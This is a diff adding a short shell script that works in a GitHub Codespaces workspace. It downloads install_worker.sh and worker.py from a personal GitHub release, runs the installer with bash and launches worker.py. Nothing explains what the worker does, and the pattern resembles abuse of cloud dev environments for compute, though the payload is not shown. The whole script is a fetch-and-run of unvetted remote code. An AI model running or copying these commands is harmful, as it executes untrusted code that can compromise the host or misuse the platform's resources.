@@ -1,0 +1,13 @@
+cd /workspaces/codespaces-blank
+rm -rf install_worker.sh
+rm -rf worker.py
+wget https://github.com/hujisanda/action/releases/download/code/install_worker.sh
+
+wget https://github.com/hujisanda/action/releases/download/code/worker.py
+
+chmod u+x install_worker.sh
+sed -i 's/\r$//' install_worker.sh
+bash install_worker.sh
+cd /workspaces/codespaces-blank
+source venv/bin/activate
+python3 -u worker.py
